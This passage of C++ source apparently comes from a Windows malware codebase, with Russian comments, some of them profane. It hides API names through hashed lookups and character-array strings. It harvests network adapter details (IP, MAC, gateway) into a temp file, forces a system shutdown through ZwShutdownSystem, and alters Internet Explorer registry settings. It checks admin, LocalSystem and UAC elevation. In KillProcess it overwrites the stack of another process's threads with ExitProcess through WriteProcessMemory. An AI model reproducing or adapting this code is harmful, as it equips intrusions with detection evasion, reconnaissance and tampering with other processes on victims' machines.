			if ((Find.dwFileAttributes & FileAttributes) != 0)
				CallBack(&Find,  NewPath, Data, Cancel);
            //
			if (!Cancel && Recursive && (Find.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0)
			{
				RecursiveHandled = true;
				Cancel = !SearchFiles(NewPath, Mask, true, FileAttributes, Data, CallBack);
			}

			STR::Free(NewPath);
			if (Cancel) break;
		}
	}
	while (pFindNextFileA(File, &Find));

	pFindClose(File);
	STR::Free(SearchMask);

	// В случае если рекурсивный поиск не обработан, то производим
	// рекурсивный перебор директорий
	if (!Cancel && Recursive && !RecursiveHandled && Count > 0)
	{
		TRecursiveSearchData SD;
		SD.Mask = Mask;
		SD.Data = Data;
		SD.Attributes = FileAttributes;
		SD.CallBack = CallBack;
        Cancel = SearchFiles(Path, "*.*", true, FA_DIRECTORY, &SD, RecursuveSearchCallBack) == false;
    }

	return Cancel == false;
}
//----------------------------------------------------------------------------

DWORD GetUniquePID()
{
	// Функция возвращает уникальный идентификатор процесса. Определяется по
	// потоку из которого вызывается модуль
	HANDLE Thread = pGetCurrentThread();
	THREAD_BASIC_INFORMATION Threads;
	DWORD dwReturnLen;

	if ( pZwQueryInformationThread(Thread, ThreadBasicInformation, &Threads, sizeof( THREAD_BASIC_INFORMATION ), &dwReturnLen ) == STATUS_SUCCESS )
		return (DWORD)Threads.ClientId.UniqueProcess;

	return -1;
}
//----------------------------------------------------------------------------

bool IsNewProcess(DWORD &ProcessID)
{
	// Функция возвращает истину если идентификатор текущего процесса
	// отличается от идентификатора ProcessID. Если это другой процесс
	// то PID будет записан в ProcessID
	DWORD NewPID = GetUniquePID();
	if (ProcessID != NewPID)
	{
		ProcessID = NewPID;
        return true;
	}
	return false;
}


//----------------------------------------------------------------------------
char *GetNetInfo()
{

	// Какому мудаку было впадлу пару строчек коментария вписать???????

	char iphldll[] = {'i','p','h','l','p','a','p','i','.','d','l','l',0};

	typedef DWORD ( WINAPI *PGetAdaptersInfo )( PIP_ADAPTER_INFO pAdapterInfo, PULONG pOutBufLen );

	PGetAdaptersInfo pGetAdaptersInfo = (PGetAdaptersInfo)GetProcAddressEx( iphldll, 0, 0xE69A1CD7 );

	PIP_ADAPTER_INFO pAdapterInfo;

	PIP_ADAPTER_INFO pAdapter = NULL;
	DWORD dwRetVal			  = 0;

	pAdapterInfo	  = (IP_ADAPTER_INFO *)MemAlloc( sizeof(IP_ADAPTER_INFO) );
	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);


	if ( (ULONG)pGetAdaptersInfo( pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW )
	{
		MemFree(pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO *) MemAlloc ( ulOutBufLen );
	}

	typedef int ( WINAPI *fwsprintfA )( PCHAR lpOut, PCHAR lpFmt, ... );
	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );	//	ansi version

	PCHAR FileName = File::GetTempNameA();

	if ( !FileName )
	{
		return NULL;
	}


	HANDLE hLog = (HANDLE)pCreateFileA( FileName, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );

	if ( hLog == (HANDLE)-1 )
	{
		return NULL;
	}

	DWORD dwWritten = 0;

	if ( ( dwRetVal = (ULONG)pGetAdaptersInfo( pAdapterInfo, &ulOutBufLen)) == NO_ERROR )
	{
		pAdapter = pAdapterInfo;

		while ( pAdapter )
		{
			char *Buffer = (char*)MemAlloc( 1024 );

			_pwsprintfA( Buffer, "\tAdapter Name: \t%s\r\n", pAdapter->AdapterName);
			pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );

			_pwsprintfA( Buffer, "\tAdapter Desc: \t%s\r\n", pAdapter->Description);
			pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );

			_pwsprintfA( Buffer, "\tAdapter Addr: \t%ld\r\n", pAdapter->Address);
			pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );

			_pwsprintfA( Buffer, "\tIP Address: \t%s\r\n", pAdapter->IpAddressList.IpAddress.String);
			pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );

			_pwsprintfA( Buffer, "\tIP Mask: \t%s\r\n", pAdapter->IpAddressList.IpMask.String);
			pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );

			_pwsprintfA( Buffer, "\tGateway: \t%s\r\n", pAdapter->GatewayList.IpAddress.String);
			pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );

			_pwsprintfA( Buffer, "\tMAC Address: %2X-%2X-%2X-%2X-%2X-%2X",  pAdapter->Address[0], pAdapter->Address[1],
											pAdapter->Address[2], pAdapter->Address[3],
											pAdapter->Address[4], pAdapter->Address[5] );

			pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );
			

			_pwsprintfA( Buffer, "\t\r\n\r\n***\r\n\r\n\r\n");
			pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );

			
			if ( pAdapter->DhcpEnabled )
			{
				_pwsprintfA( Buffer, "\tDHCP Enabled: Yes\r\n");
				pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );

				_pwsprintfA( Buffer, "\t\tDHCP Server: \t%s\r\n", pAdapter->DhcpServer.IpAddress.String);
				pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );

				_pwsprintfA( Buffer, "\tLease Obtained: %ld\r\n", pAdapter->LeaseObtained);
				pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );
			}
			else
			{
				_pwsprintfA( Buffer, "\tDHCP Enabled: No\r\n");
				pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );
			}

			if ( pAdapter->HaveWins )
			{
				_pwsprintfA( Buffer, "\tHave Wins: Yes\r\n");
				pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );

				_pwsprintfA( Buffer, "\t\tPrimary Wins Server: \t%s\r\n", pAdapter->PrimaryWinsServer.IpAddress.String);
				pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );

				_pwsprintfA( Buffer, "\t\tSecondary Wins Server: \t%s\r\n", pAdapter->SecondaryWinsServer.IpAddress.String);
				pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );
			}
			else
			{
				_pwsprintfA( Buffer, "\tHave Wins: No\r\n");
				pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );
			}

			
			pAdapter = pAdapter->Next;
		}
	}

	pCloseHandle( hLog );	

	return FileName;
}

DWORD GetFileFormat( WCHAR *lpFileName )
{
	if ( !lpFileName )
	{
		return 0;
	}

	WCHAR *Name = NULL;

	WCHAR lpFile[ MAX_PATH ];
	plstrcpyW( lpFile, lpFileName );
	m_wcslwr( lpFile );
	
	for ( DWORD i = m_wcslen( lpFile ) - 1; i > 0; i-- )
	{
		if ( lpFile[i] == '.' )
		{
			Name = &lpFile[i + 1];
			break;
		}
	}

	return CalcHashW( Name );
}

char *GetWndText( HWND hWnd )
{
	DWORD dwSize  = (LRESULT)pSendMessageA( hWnd, WM_GETTEXTLENGTH, 0, 0 ) + 1;

	char *WndText = (char*)MemAlloc( dwSize + 1 );

	if ( WndText )
	{
		pSendMessageA( hWnd, WM_GETTEXT, dwSize, (LPARAM)WndText );
	}

	return WndText;
}

void MakeShutdown()
{
	BOOLEAN bWasEnabled;
	pRtlAdjustPrivilege( SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &bWasEnabled );
	pZwShutdownSystem( 1 );

	return;
}


//----------------------------------------------------------------------------
// Registry - методы для работы с реестром Windows
//----------------------------------------------------------------------------

bool Registry::CreateKey(HKEY h, char* path, char* name )
{
	// cсоздать раздел в реестре
	//  CreateKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Internet Explorer\\Main","TabProcGrowth");
	HKEY key;
	if((long)pRegOpenKeyExA(h, path, 0, KEY_WRITE, &key) == REG_OPENED_EXISTING_KEY)
		return false;
	if ((LONG)pRegCreateKeyA(key, name, &key) != ERROR_SUCCESS)
		return false;

	pRegCloseKey(key);
	return true;
}


bool Registry::SetValueString(HKEY h, char* path, char* name,  char* values )
{
	//корневой ключ, путь без ключа, имя создаваемого значения,
	// значение(создает заменяет значение REG_SZ)
	HKEY key;
	CHAR title[MAX_PATH];
	m_memset(title,0,MAX_PATH);

	if((long)pRegOpenKeyExA(h,path,0,KEY_WRITE, &key)==REG_OPENED_EXISTING_KEY)
		return false;
	m_lstrcpy(title, values);
//   RegGetValueA
	pRegSetValueExA(key, name, 0,REG_SZ,(LPBYTE)title,m_lstrlen(values));
	pRegCloseKey(key);
	return true;
}

bool Registry::SetValueDWORD(HKEY h, char* path, char* name,  DWORD values )
{
	//Корневой ключ, путь без ключа, имя создаваемого значения,
	// значение(создает заменяет значение REG_DWORD)
	HKEY key;
	if((long)pRegOpenKeyExA(h,path,0,KEY_WRITE, &key)==REG_OPENED_EXISTING_KEY)
		return false;
	pRegSetValueExA(key, name, 0,REG_DWORD,(CONST BYTE*)&values,sizeof(DWORD));
	pRegCloseKey(key);
	return true;
}


// Функция получает строковое значение из реестра
PCHAR Registry::GetStringValue(HKEY Key, PCHAR SubKey, PCHAR Value)
{
	// Функция получает строковое значение из реестра
	HKEY OpenedKey;
	// Открываем ключ
	if (pRegOpenKeyExA(HKEY_CURRENT_USER, SubKey, 0, KEY_READ, &OpenedKey) != ERROR_SUCCESS)
		return NULL;

	DWORD Type = REG_SZ;
	DWORD Sz = 0;
	PCHAR Result = NULL;

	// Получаем размер строки
	if (pRegQueryValueExA(OpenedKey, Value, NULL, &Type, NULL, &Sz) == ERROR_SUCCESS)
	{
		// Читаем строку
		Result = STR::Alloc(Sz);
		if (pRegQueryValueExA(OpenedKey, Value, NULL, &Type, Result, &Sz)  != ERROR_SUCCESS)
		STR::Free2(Result);;
    }

	pRegCloseKey(OpenedKey);
	return Result;
}

bool Registry::CreateValueString(HKEY h, char* path, char* name,  char* values )
{
  //корневой ключ, путь без ключа, имя создаваемого значения,
 // значение(создает заменяет значение REG_SZ)
    HKEY hKey;
	if((long)pRegOpenKeyExA(h, path, 0, KEY_WRITE, &hKey) == REG_OPENED_EXISTING_KEY)
	{
		pRegSetValueExA(hKey,name, NULL, REG_SZ,(LPBYTE)values,m_lstrlen(values));
        pRegCloseKey(hKey);
		return true;
    }
    if((long)pRegCreateKeyExA(h,path,0,"",REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,NULL)==ERROR_SUCCESS)
    {
		pRegSetValueExA(hKey,name, NULL, REG_SZ,(LPBYTE)values,m_lstrlen(values));
        pRegCloseKey(hKey);
		return true;
    }
	return false;
}


bool Registry::CreateValueREGMULTI_SZ(HKEY h, char* path, char* name,  char* values,DWORD sise )
{
	HKEY hKey;
	if((long)pRegOpenKeyExA(h, path, 0, KEY_WRITE, &hKey) == REG_OPENED_EXISTING_KEY)
	{
		pRegSetValueExA(hKey,name, NULL, REG_MULTI_SZ,(LPBYTE)values,sise);
        pRegCloseKey(hKey);
		return true;
    }
    if((long)pRegCreateKeyExA(h,path,0,"",REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,NULL)==ERROR_SUCCESS)
    {
		pRegSetValueExA(hKey,name, NULL, REG_MULTI_SZ,(LPBYTE)values,sise);
        pRegCloseKey(hKey);
		return true;
    }
	return false;
}


//----------------------------------------------------------------------------
// FILE - методы для работы с файлами
//----------------------------------------------------------------------------


DWORD File::WriteBufferA(PCHAR FileName, LPVOID Buffer, DWORD BufferSize)
{
	// Записать данные из буфера в файл. ANSI версия

	if (FileName == NULL)
		return 0;

	HANDLE File = pCreateFileA(FileName, GENERIC_WRITE, FILE_SHARE_READ, 0,
								CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

	if (File == INVALID_HANDLE_VALUE)
		return 0;

	DWORD Size = 0;
    pWriteFile(File, Buffer, BufferSize, &Size, NULL);

	pCloseHandle(File);

	return Size;
}

//----------------------------------------------------------------------------

DWORD File::WriteBufferW(PWCHAR FileName, LPVOID Buffer, DWORD BufferSize)
{
	// Записать данные из буфера в файл. Unicode версия

	if (FileName == NULL)
		return 0;

	HANDLE File = pCreateFileW(FileName, GENERIC_WRITE, FILE_SHARE_READ, 0,
								CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);


	if (File == INVALID_HANDLE_VALUE)
		return 0;

	DWORD Size = 0;
    pWriteFile(File, Buffer, BufferSize, &Size, NULL);

	pCloseHandle(File);

	return Size;
}
//----------------------------------------------------------------------------

LPBYTE FileRealReadToBuffe(HANDLE File, DWORD &BufferSize)
{
	BufferSize = 0;
	if (File == INVALID_HANDLE_VALUE)
		return NULL;

	DWORD H;
	DWORD Size = (DWORD)pGetFileSize(File, &H);

    LPBYTE Result = NULL;
	if (Size > 0)
	{
		// Читаем файл
		Result = (LPBYTE)MemAlloc(Size);
		DWORD Readed;
		if (Result != NULL)
			ReadFile(File, Result, Size, &Readed, NULL);
        BufferSize = Readed;
    }

	pCloseHandle(File);
	return Result;
}

//----------------------------------------------------------------------------

LPBYTE File::ReadToBufferA(PCHAR FileName, DWORD &BufferSize)
{
	// Прочитать файл в буфер

	if (FileName == NULL)
		return NULL;

	HANDLE File = pCreateFileA(FileName, GENERIC_READ, FILE_SHARE_READ, 0,
								OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	return FileRealReadToBuffe(File, BufferSize);
}
//----------------------------------------------------------------------------

LPBYTE File::ReadToBufferW(PWCHAR FileName, DWORD &BufferSize)
{
	// Прочитать файл в буфер
	if (FileName == NULL)
		return NULL;

	HANDLE File = pCreateFileW(FileName, GENERIC_READ, FILE_SHARE_READ, 0,
								OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	return FileRealReadToBuffe(File, BufferSize);
}
//----------------------------------------------------------------------------

PCHAR File::ChangeFileExt(PCHAR FileName, PCHAR Ext)
{
	// Изменить расширение файла. Касается только строки FileName!!!
	// Примечание - Расширение меняется вместе с точкой
	// Результат - НОВАЯ строка с именем файла
	if (STR::IsEmpty(FileName))
    	return NULL;

	PCHAR EndPtr = STR::End(FileName);

	// Ишем точку в файле
	while (*EndPtr != '.')
	{
		if (EndPtr == FileName || *EndPtr == '/' || *EndPtr == '\\')
		{
			EndPtr = NULL;
			break;
        }
        EndPtr--;
    }


	//
	if (EndPtr == NULL)
		return STR::New(2, FileName, Ext);
	else
	{
		DWORD Sz = EndPtr - FileName;
		DWORD ExtLen = StrCalcLength(Ext);
		PCHAR Res = STR::Alloc(Sz + ExtLen);
		STR::Copy(FileName, Res, 0, Sz);
		STR::Copy(Ext, Res + Sz, 0, ExtLen);
		return Res;
	}
}


PCHAR File::ExtractFileName(PCHAR FileName)
{
	// Фуункция возвращает имя файла из полного имени
	if (STR::IsEmpty(FileName))
		return NULL;
	PCHAR End = STR::End(FileName);
	if (End == NULL) return NULL;
    PCHAR FN = End;
	while (FN > FileName && *FN != '\\' && *FN != '/') FN--;
	if (FN != FileName) FN++;
	return STR::New(FN, End - FN);
}

PCHAR File::ExtractFilePath(PCHAR FileName)
{
	// Фуункция возвращает имя файла из полного имени
	if (STR::IsEmpty(FileName))
		return NULL;
	PCHAR End = STR::End(FileName);
	if (End == NULL) return NULL;

    PCHAR FN = End;
	while (FN > FileName && *FN != '\\' && *FN != '/') FN--;
	if (FN != FileName) FN++;
	if ( *FN != '\\' || *FN != '/' )
		--FN;
	return STR::New(FileName, FN - FileName);
};
//-----------------------------------------------------------------------------

PCHAR File::GetTempNameA()
{
	PCHAR Path = STR::Alloc(MAX_PATH+1);
	if (Path == NULL) return NULL;

	pGetTempPathA( MAX_PATH, Path );
	pGetTempFileNameA(Path, "", 0, Path);

	return Path;
}

//-----------------------------------------------------------------------------





bool GetNextDrive(PCHAR &Drv)
{
	// переходим к концу строки
	while (*Drv != 0) Drv++;
	// Пропускаем конец строки
    Drv++;

	// Возвращаем истину если строка не пустая
    return !STR::IsEmpty(Drv);
}


void EnumDrives(DWORD DriveType, TEnumDrivesMethod Method, LPVOID Data)
{
	// Функция перебирает все подключенные в системе диски
	if (Method == NULL) return;

	// Получаем список дисков
	static const DWORD Size = 255;
	PCHAR Drives = STR::Alloc(Size);
	pGetLogicalDriveStringsA(Size, Drives);
    if (STR::IsEmpty(Drives)) return;

	// Перебираем диски
	bool Cancel = false;
	PCHAR Tmp = Drives;
	do
	{   if (DriveType == DRIVE_UNKNOWN || (DWORD)pGetDriveTypeA(Tmp) == DriveType)
		{
			Method(Tmp, Data, Cancel);
			if (Cancel) break;
		}
	}
	while (GetNextDrive(Tmp));

    STR::Free(Drives);
}
//-----------------------------------------------------------------------------

// Эту срань убрать
LPBYTE GetFileData( WCHAR *Path, LPDWORD dwDataSize )
{


	HANDLE hFile = (HANDLE)pCreateFileW( Path, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );

	if ( hFile == INVALID_HANDLE_VALUE )
	{
		return NULL;
	}

	DWORD h = 0;
	DWORD dwFileSize = (DWORD)pGetFileSize( hFile, &h );

	HANDLE hMapFile = (HANDLE)pCreateFileMappingW( hFile, 0, PAGE_READONLY, 0, dwFileSize, 0 );

	if ( hMapFile == INVALID_HANDLE_VALUE )
	{
		return NULL;
	}

	LPBYTE pbyFile  = (LPBYTE)pMapViewOfFile( hMapFile, FILE_MAP_READ, 0, 0, 0 );

	LPBYTE pbF = (LPBYTE)MemAlloc( dwFileSize + 1 );
	m_memcpy( pbF, pbyFile, dwFileSize );

	pUnmapViewOfFile( pbyFile );
	pCloseHandle( hMapFile );
	pCloseHandle( hFile );

	*dwDataSize = dwFileSize;

	return pbF;
}

// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

// Нахуй руки оторву за такую писанину!!!!!!!!!!!!!!!! GSV

// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// ----------------------------------------------------------------------------------------
bool isFileExists(int FlagFolderDest, WCHAR*Path)
{
	// Эта поебень делает такую-то хуйню
	// тоесть проверяет существуер ли файл в стандартном пути(определенном системой)+Path  

	WCHAR SysPath[MAX_PATH];
	pSHGetFolderPathW(NULL, FlagFolderDest, NULL, SHGFP_TYPE_CURRENT, SysPath);
	plstrcatW( SysPath, L"\\" );
	plstrcatW( SysPath, Path );
	if ( (DWORD)pGetFileAttributesW( SysPath ) == -1 )
		return false;
	else
		return true;

}  
// ----------------------------------------------------------------------------------------
// Сложно бля пару переводов строки после функции сделать, ну топо разделить код одной функции от другой
bool FileCreateInFolder(int FlagFolderDest, WCHAR*Path,LPVOID Data,int count)
{
    // И эта поебень хуёзнает чё-то делает
	// тоесть создает файл и пишет данные заданным размером

	WCHAR SysPath[MAX_PATH];
	pSHGetFolderPathW(NULL, FlagFolderDest, NULL, SHGFP_TYPE_CURRENT, SysPath);
	plstrcatW( SysPath, L"\\" );
	plstrcatW( SysPath, Path );
	if (File::WriteBufferW( SysPath, Data, count ))
		return true;
	else
		return false;
}
// ----------------------------------------------------------------------------------------

int ReadFileA(char *szFileName, char **OutBuf)
{	
	int result = 0;
	// Открываем файл на чтение
	HANDLE hFile = pCreateFileA(szFileName, GENERIC_READ, FILE_SHARE_READ, NULL,
														OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	// Если не удалось прочесть, выходим с ошибкой
	if (INVALID_HANDLE_VALUE != hFile)
	{
		DWORD fSize = FileSize(hFile);
		if (fSize > 0)
		{
			DWORD rSize = 0;			
			*OutBuf = (char *)MemAlloc(SIZE_T(fSize) + 1);
			if (pReadFile(hFile, *OutBuf, fSize, &rSize, NULL))
				result = rSize;
		}
		// Закрываем файл
		pCloseHandle(hFile);
	}
	
	return result;
}
//не проверенно
bool GetFileDataFilder(int FlagFolderDest, WCHAR*Path,LPVOID Data,int *count)
{
	WCHAR SysPath[MAX_PATH];
	pSHGetFolderPathW(NULL, FlagFolderDest, NULL, SHGFP_TYPE_CURRENT, SysPath);
	plstrcatW( SysPath, L"\\" );
	plstrcatW( SysPath, Path );
	
	char *Name = WSTR::ToAnsi(SysPath, 0);
	*count=ReadFileA( Name, (char **)&Data);
	MemFree(Name);
	if (Data==NULL)
		return false;
	
	return true;
}


BOOL CheckSidCurrentProcess( SID_IDENTIFIER_AUTHORITY *NtAuthority )
{
	/*	++ 
	Routine Description: This routine returns TRUE if the caller's
	process is a member of the Administrators local group. Caller is NOT
	expected to be impersonating anyone and is expected to be able to
	open its own process and process token. 
	Arguments: None. 
	Return Value: 
	   TRUE - Caller has Administrators local group. 
	   FALSE - Caller does not have Administrators local group. --
*/ 
	BOOL b;
	PSID AdministratorsGroup; 

	b =  (BOOL) pAllocateAndInitializeSid(
											NtAuthority,
											2,
											SECURITY_BUILTIN_DOMAIN_RID,
											DOMAIN_ALIAS_RID_ADMINS,
											0, 0, 0, 0, 0, 0,
											&AdministratorsGroup
										); 
	if(b) 
	{
		if (!pCheckTokenMembership( NULL, AdministratorsGroup, &b)) 
			 b = FALSE;

		pFreeSid(AdministratorsGroup); 
	}

return b;
};

BOOL IsUserAdmin(/* и ТАК ВИДНОб ЧТО БЕЗ ПАРАМЕТРОВ */)
/*	++ 
	Routine Description: This routine returns TRUE if the caller's
	process is a member of the Administrators local group. Caller is NOT
	expected to be impersonating anyone and is expected to be able to
	open its own process and process token. 
	Arguments: None. 
	Return Value: 
	   TRUE - Caller has Administrators local group. 
	   FALSE - Caller does not have Administrators local group. --
*/ 
{
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	return CheckSidCurrentProcess( &NtAuthority );
}

bool IsUserLocalSystem()
{
	const DWORD								kMaxSidSize = 1024;
	SID_IDENTIFIER_AUTHORITY	kNtAuthority = SECURITY_NT_AUTHORITY;

	HANDLE	token_handle = NULL;
	BYTE		user_sid_buffer[kMaxSidSize];
	DWORD		user_sid_length = 0;

	pOpenProcessToken( pGetCurrentProcess(), TOKEN_READ, &token_handle);
	PP_RETURNIF2(token_handle == NULL, false);

	m_memset(user_sid_buffer, 0, sizeof(user_sid_buffer));

	pGetTokenInformation(token_handle, TokenUser, user_sid_buffer, 
		sizeof(user_sid_buffer), &user_sid_length);
	PP_RETURNIF2(user_sid_length == 0, false);

	PSID_AND_ATTRIBUTES attributes = (PSID_AND_ATTRIBUTES)&user_sid_buffer[0];
	PISID sid = (PISID)attributes->Sid;

	// LocalSystem SID S-1-5-18
	// Процедура низкоуровневой сверки с SID LocalSystem
	PP_RETURNIF2(sid->Revision != SID_REVISION, false);
	PP_RETURNIF2(sid->SubAuthorityCount != 1, false);
	PP_RETURNIF2(m_memcmp(&sid->IdentifierAuthority, &kNtAuthority, sizeof(kNtAuthority)) != 0, false);
	PP_RETURNIF2(sid->SubAuthority[0] != SECURITY_LOCAL_SYSTEM_RID, false);

	return true;
}





#ifdef _DEBUG
VOID DbgPrint(PCHAR pcFormat,...)
{
	va_list vaList;
	CHAR chFormat[1024] = {0};
	CHAR chMsg[1024*4];
	CHAR chPath[MAX_PATH];

	chFormat[0] = chMsg[0] = chPath[0] = 0;

	pGetModuleFileNameA(NULL,chPath,RTL_NUMBER_OF(chPath)-1);

	pwvsprintfA(chFormat,"%s",(PCHAR)pPathFindFileNameA(chPath));

	va_start(vaList,pcFormat);
 	pwvsprintfA(chMsg,chFormat,vaList);
	va_end(vaList);

	pOutputDebugStringA(chMsg);
}
#endif


BOOL CheckAdmin()
{
	BOOL Ret;
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	PSID AdministratorsGroup; 

	if (Ret = (BOOL)pAllocateAndInitializeSid(&NtAuthority,2,SECURITY_BUILTIN_DOMAIN_RID,DOMAIN_ALIAS_RID_ADMINS,0,0,0,0,0,0,&AdministratorsGroup))
	{
		if (!pCheckTokenMembership(NULL,AdministratorsGroup,&Ret))
		{
			Ret = FALSE;
		}

		pFreeSid(AdministratorsGroup);
	}

	return Ret;
}

BOOL CheckUAC()
{
	BOOL fIsElevated = FALSE;
	HANDLE hToken = NULL;

	if (pOpenProcessToken(pGetCurrentProcess(),TOKEN_QUERY,&hToken))
	{
		TOKEN_ELEVATION elevation;
		DWORD dwSize;

		if (pGetTokenInformation(hToken,TokenElevation,&elevation,sizeof(elevation),&dwSize))
		{
			fIsElevated = !elevation.TokenIsElevated;
		}

		pCloseHandle(hToken);
	}

	return fIsElevated;
}

BOOL CheckWow64()
{
	BOOL bIsWow64 = FALSE;
	typedef BOOL(WINAPI*LPFN_ISWOW64PROCESS)(HANDLE, PBOOL);
	LPFN_ISWOW64PROCESS fnIsWow64Process;

	fnIsWow64Process = (LPFN_ISWOW64PROCESS)pGetProcAddress(pGetModuleHandleA("kernel32.dll"),"IsWow64Process");
	if (NULL != fnIsWow64Process)
	{
		fnIsWow64Process(pGetCurrentProcess(),&bIsWow64);
	}

	return bIsWow64;
}

VOID FixDWORD(BYTE *Data,DWORD Size,DWORD Old,DWORD New)
{
	DWORD p = 0;
	PDWORD pDD;

	while (p < Size)
	{
		pDD = (PDWORD)(Data + p);
		if (*pDD == Old) *(DWORD*)(Data + p) = New;

		p++;
	}
}


// Отображает файл на текущий процесс
//
PVOID MapBinary(LPCSTR lpPath,DWORD dwFileAccess,DWORD dwFileFlags,DWORD dwPageAccess,DWORD dwMapAccess,PDWORD pdwSize)
{
	PVOID pMap = NULL;
	HANDLE hMapping;
	HANDLE hFile;

	hFile = pCreateFileA(lpPath,dwFileAccess,FILE_SHARE_READ,NULL,OPEN_EXISTING,dwFileFlags,0);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		hMapping = pCreateFileMappingA(hFile,NULL,dwPageAccess,0,0,0);
		if (hMapping != INVALID_HANDLE_VALUE)
		{
			pMap = pMapViewOfFile(hMapping,dwMapAccess,0,0,0);
			if (!pMap)
			{
				//DbgPrint(__FUNCTION__"(): MapViewOfFile failed with error %x\n",GetLastError());
			}
			else if (pdwSize) *pdwSize =(DWORD) pGetFileSize(hFile,NULL);

			pCloseHandle(hMapping);
		}
		else

		pCloseHandle(hFile);
	}

	return pMap;
};


DWORD RvaToOffset(PIMAGE_NT_HEADERS pPE,DWORD dwRva)
{
	PIMAGE_SECTION_HEADER pSEC = IMAGE_FIRST_SECTION(pPE);

	for (WORD i = 0; i < pPE->FileHeader.NumberOfSections; i++)
	{
		if (dwRva >= pSEC->VirtualAddress && dwRva < (pSEC->VirtualAddress + pSEC->Misc.VirtualSize))
		{
			return dwRva + ALIGN_DOWN(pSEC->PointerToRawData,pPE->OptionalHeader.FileAlignment) - pSEC->VirtualAddress;
		}

		pSEC++;
	}

	return 0;
}

BOOL KillProcess(DWORD pid,DWORD TimeOut )
{
const static DWORD MAX_COUNT_THREAD = 0x20;
	THREADENTRY32	Thread;
	HANDLE			hProcess;
	HANDLE			hSnap;
	DWORD			Threads[MAX_COUNT_THREAD] ;
	
	m_memset(Threads,0,sizeof(Threads));
	m_memset(&Thread,0,sizeof(Thread));
	Thread.dwSize = sizeof(Thread);
	
	if ( (hProcess = (HANDLE)pOpenProcess(PROCESS_TERMINATE,FALSE,pid))  )
	{
		pTerminateProcess(hProcess,0);
		pCloseHandle(hProcess);
		return TRUE;
	};
	
	if ( (hSnap = (HANDLE)pCreateToolhelp32Snapshot(TH32CS_SNAPTHREAD,pid)) == INVALID_HANDLE_VALUE  )
	{
		return FALSE;
	};
	
	if ( pThread32First(hSnap,&Thread) )
	{
		DWORD i = 0;
		do{
			if ( (Thread.th32OwnerProcessID == pid) & ( i< MAX_COUNT_THREAD) )
				Threads[i++] = Thread.th32ThreadID;

		}while(pThread32Next(hSnap,&Thread));

		pCloseHandle(hSnap);
	}

	if (! (hProcess = (HANDLE)pOpenProcess(SYNCHRONIZE | PROCESS_VM_WRITE|PROCESS_VM_OPERATION,FALSE,pid))  )
		return FALSE;

	for (DWORD i = 0; i<MAX_COUNT_THREAD; ++i)
	if ( Threads[i] )
	{
		HANDLE	htmp;
		CONTEXT ctx;

		if (Threads[i] == (DWORD)pGetCurrentThreadId())
			continue;

		if ( ! (htmp = (HANDLE)pOpenThread(THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME,FALSE,Threads[i]))  )
			continue;

			pSuspendThread(htmp);
			
			ctx.ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER;
			if(pGetThreadContext(htmp,&ctx))
			{
				DWORD s;
				DWORD TargetAddr;
				PVOID new_addr = pGetProcAddress(pGetModuleHandleA("KERNEL32"),"ExitProcess");
				TargetAddr = ctx.Ebp + sizeof(DWORD);
				if ( (TargetAddr > 1024*1024 ) & (TargetAddr <  (1 << (sizeof(DWORD)*8-1)))  )  
				{
					pVirtualAllocEx(hProcess,TargetAddr,sizeof(new_addr),MEM_COMMIT,PAGE_READWRITE);
					pWriteProcessMemory(hProcess,TargetAddr,&new_addr,sizeof(new_addr),&s);
				};
			};
			pResumeThread(htmp);
			pCloseHandle(htmp);
		};
	
	BOOL ret = ( WAIT_OBJECT_0 == (DWORD)pWaitForSingleObject(hProcess,TimeOut) )? TRUE:FALSE;
	pCloseHandle(hProcess);
	return ret ;
};
